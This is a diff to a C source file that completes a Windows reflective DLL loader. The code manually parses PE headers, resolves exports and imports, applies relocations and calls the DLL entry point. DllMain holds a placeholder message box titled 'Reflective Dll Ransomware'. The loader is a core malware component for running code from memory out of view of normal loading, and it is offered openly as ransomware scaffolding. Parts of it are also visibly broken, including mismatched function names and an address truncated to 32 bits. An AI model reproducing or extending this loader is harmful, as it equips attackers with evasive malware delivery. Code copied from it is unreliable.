@@ -156,17 +156,31 @@ typedef struct _PEB
     ULONG SessionId;
 } PEB, *PPEB;
 
+/* Data stuctures for relocations */
+typedef struct BASE_RELOCATION_BLOCK
+{
+    DWORD PageAddress;
+    DWORD BlockSize;
+} BASE_RELOCATION_BLOCK, *PBASE_RELOCATION_BLOCK;
+
+typedef struct BASE_RELOCATION_ENTRY
+{
+    USHORT Offset : 12;
+    USHORT Type : 4;
+} BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;
+
 /* Low-level, function pointer types for required functions */
 typedef HMODULE(WINAPI *LOADLIBRARYA)(LPCSTR);
 typedef FARPROC(WINAPI *GETPROCADDRESS)(HMODULE, LPCSTR);
 typedef LPVOID(WINAPI *VIRTUALALLOC)(LPVOID, SIZE_T, DWORD, DWORD);
 
+typedef BOOL(WINAPI *entry_DLLMAIN)(HINSTANCE, DWORD, LPVOID);
 /* End data structures */
 
 /*
     Fill a block of memory at destination with zeros.
 */
-inline void zeroize(DWORD64 destination, SIZE_T size)
+static inline void zeroize(DWORD64 destination, SIZE_T size)
 {
     PULONG dest = (PULONG)destination;
     SIZE_T count = size / sizeof(ULONG);
@@ -182,7 +196,7 @@ inline void zeroize(DWORD64 destination, SIZE_T size)
 /*
     Convert a wide character string at destination into regular ASCII.
 */
-inline SIZE_T wchar_to_ascii(PCHAR destination, PWCHAR source, SIZE_T max)
+static inline SIZE_T wchar_to_ascii(PCHAR destination, PWCHAR source, SIZE_T max)
 {
     if (!destination || !source || max == 0)
     {
@@ -210,7 +224,7 @@ inline SIZE_T wchar_to_ascii(PCHAR destination, PWCHAR source, SIZE_T max)
 /*
     Compare two strings until reaching '\0'.
 */
-inline BOOL string_compare_a(LPCSTR str1, LPCSTR str2)
+static inline BOOL string_compare_a(LPCSTR str1, LPCSTR str2)
 {
     while (*str1 && (*str1 == *str2))
     {
@@ -228,7 +242,7 @@ inline BOOL string_compare_a(LPCSTR str1, LPCSTR str2)
     independently of the host process.
     See:https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlea
 */
-inline DWORD64 get_module_handle_a(char *lp_module_name)
+static inline DWORD64 get_module_handle_a(char *lp_module_name)
 {
     // Get the pointer to the PEB
     // See: https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb
@@ -262,20 +276,38 @@ inline DWORD64 get_module_handle_a(char *lp_module_name)
     return 0;
 }
 
+/* Read headers from PE file format */
+static inline BOOL load_pe_headers(PIMAGE_DOS_HEADER *dos, PIMAGE_NT_HEADERS *nt, PIMAGE_FILE_HEADER *file, PIMAGE_OPTIONAL_HEADER *opt, PBYTE *image_base)
+{
+    *dos = (PIMAGE_DOS_HEADER)*image_base;
+    if ((*dos)->e_magic != IMAGE_DOS_SIGNATURE)
+        return FALSE;
+
+    *nt = (PIMAGE_NT_HEADERS)((PBYTE)*dos + (*dos)->e_lfanew);
+    if ((*nt)->Signature != IMAGE_NT_SIGNATURE)
+        return FALSE;
+
+    *file = (PIMAGE_FILE_HEADER)(*image_base + (*dos)->e_lfanew + sizeof(DWORD));
+    *opt = (PIMAGE_OPTIONAL_HEADER)((PBYTE)*file + sizeof(IMAGE_FILE_HEADER));
+
+    return TRUE;
+}
+
 /*
     Low level version of GetProcessAddress function. Manually run through the export table to find
     the matching matching name. Return the function address.
     See: https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress
 
 */
-inline DWORD64 get_process_address(DWORD64 module_base, LPCSTR lp_proc_name)
+static inline DWORD64 get_process_address(DWORD64 module_base, LPCSTR lp_proc_name)
 {
     PIMAGE_DOS_HEADER dos = NULL;
     PIMAGE_NT_HEADERS nt = NULL;
     PIMAGE_FILE_HEADER file = NULL;
     PIMAGE_OPTIONAL_HEADER opt = NULL;
 
-    // TODO:Parse the PE headers
+    // Parse the PE headers
+    load_pe_headers(&dos, &nt, &file, &opt, (PBYTE *)&module_base);
 
     // Retrieve the export table
     // See: https://learn.microsoft.com/en-us/windows/win32/debug/pe-format#the-edata-section-image-only Export Directory Table
@@ -297,23 +329,26 @@ inline DWORD64 get_process_address(DWORD64 module_base, LPCSTR lp_proc_name)
     return 0;
 }
 
-inline DWORD64 copy_memory(PBYTE target, PBYTE source, SIZE_T len)
+static inline DWORD64 copy_memory(DWORD64 target, DWORD64 source, SIZE_T len)
 {
-    while (len > 0)
+    PBYTE targ = (PBYTE)target;
+    PBYTE src = (PBYTE)source;
+
+    while (len-- > 0)
     {
-        *target++ = *source++;
+        *targ++ = *src++;
     }
     return target;
 }
 
-void ReflexiveLoad()
+void ReflectiveLoad()
 {
     // Step 1: Calculate the address of own image
     DWORD64 loader_image_addr;
-    loader_image_addr = (DWORD64)__buildin_extract_return_addr(__builtin_return_address(0));
+    loader_image_addr = (DWORD64)__builtin_extract_return_addr(__builtin_return_address(0));
 
     // Calculate the ReflexiveLoader NT headers address
-    PIMAGE_NT_HEADERS32 nt_headers_addr;
+    PIMAGE_NT_HEADERS nt_headers_addr;
     while (1 == 1)
     {
         // Verfiy if memory at loader_image_addr is a valid DOS header.
@@ -365,7 +400,7 @@ void ReflexiveLoad()
     DWORD data_addr;
     PIMAGE_SECTION_HEADER section_header_addr = IMAGE_FIRST_SECTION(nt_headers_addr);
 
-    for (; section_header_addr->VirtualAddress != (DWORD)NULL; section_header_addr++)
+    for (; section_header_addr->VirtualAddress != (DWORD64)NULL; section_header_addr++)
     {
         virtual_addr = dll_base + section_header_addr->VirtualAddress;
         data_addr = loader_image_addr + section_header_addr->PointerToRawData;
@@ -373,7 +408,88 @@ void ReflexiveLoad()
         copy_memory(virtual_addr, data_addr, section_header_addr->SizeOfRawData);
     }
 
-    // Step 6: resolve imports
+    // Step 6: resolve import address table
 
-    // Step 7: call the dll
+    // Get relative address of the imports directory
+    IMAGE_DATA_DIRECTORY imports_data_directory = nt_headers_addr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
+    // Get the absolute address to the first dll descriptor (of the Loader)
+    PIMAGE_IMPORT_DESCRIPTOR import_descriptor = (PIMAGE_IMPORT_DESCRIPTOR)(dll_base + imports_data_directory.VirtualAddress);
+    LPCSTR import_name;
+    HMODULE import_address;
+    PIMAGE_THUNK_DATA thunk_data_address;
+    PIMAGE_IMPORT_BY_NAME import_by_name_address;
+
+    // Iterate through all imports
+    for (; import_descriptor->Name != (DWORD64)NULL; import_descriptor++)
+    {
+        // Retrieve the import name and their address
+        import_name = (LPCSTR)(dll_base + import_descriptor->Name);
+        import_address = p_load_library_a(import_name);
+
+        if (import_address)
+        {
+            // From the imported dll get first thunk
+            thunk_data_address = (PIMAGE_THUNK_DATA)(dll_base + import_descriptor->FirstThunk);
+
+            // Iterate through all thunks
+            for (; thunk_data_address->u1.AddressOfData != (DWORD64)NULL; thunk_data_address++)
+            {
+                // Retrieve the name of the function
+                import_by_name_address = (PIMAGE_IMPORT_BY_NAME)(dll_base + thunk_data_address->u1.AddressOfData);
+                // Overwrite with absolute address of the function
+                thunk_data_address->u1.Function = (DWORD64)get_proc_address(import_address, import_by_name_address->Name);
+            }
+        }
+    }
+
+    // Step 7: resolve relocations
+
+    // Relocation difference between true base address and the assumed dummy address
+    DWORD64 base_diff = dll_base - nt_headers_addr->OptionalHeader.ImageBase; // true_base - dummy_base
+
+    // Retrieve the Relocation Data Diretory
+    // See: https://0xrick.github.io/win-internals/pe7/
+    //      https://learn.microsoft.com/en-us/windows/win32/debug/pe-format, Optional Header Data Directories
+    IMAGE_DATA_DIRECTORY reloc_data_directory = nt_headers_addr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
+    PIMAGE_BASE_RELOCATION base_reloc_address;
+    PBASE_RELOCATION_ENTRY reloc_entry_address;
+    DWORD64 reloc_block_address;
+    DWORD64 reloc_block_entry_count;
+
+    // Check if any relocations are required
+    if (reloc_data_directory.Size)
+    {
+        base_reloc_address = (PIMAGE_BASE_RELOCATION)(dll_base + reloc_data_directory.VirtualAddress);
+
+        while (base_reloc_address->SizeOfBlock)
+        {
+            // Retrieve the relocation page and the number of relocations
+            reloc_block_address = dll_base + base_reloc_address->VirtualAddress;
+            reloc_block_entry_count = (base_reloc_address->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(BASE_RELOCATION_ENTRY);
+
+            // Walk through each relocation
+            reloc_entry_address = (PBASE_RELOCATION_ENTRY)((DWORD64)base_reloc_address + sizeof(IMAGE_BASE_RELOCATION));
+            while (reloc_block_entry_count--)
+            {
+                // Apply the relocation
+                if (reloc_entry_address->Type == IMAGE_REL_BASED_DIR64)
+                    *(DWORD64 *)(reloc_block_address + reloc_entry_address->Offset) += base_diff;
+
+                reloc_entry_address = (PBASE_RELOCATION_ENTRY)((DWORD64)reloc_entry_address + sizeof(BASE_RELOCATION_ENTRY));
+            }
+
+            base_reloc_address = (PIMAGE_BASE_RELOCATION)((DWORD64)base_reloc_address + base_reloc_address->SizeOfBlock);
+        }
+    }
+
+    // Step 8: call the dll
+    DWORD64 entrypoint_address = dll_base + nt_headers_addr->OptionalHeader.AddressOfEntryPoint;
+
+    ((entry_DLLMAIN)entrypoint_address)((HINSTANCE)dll_base, DLL_PROCESS_ATTACH, NULL);
+}
+
+BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
+{
+    MessageBoxA(NULL, "Hello world!", "Reflective Dll Ransomware", MB_OK);
+    return TRUE;
 }
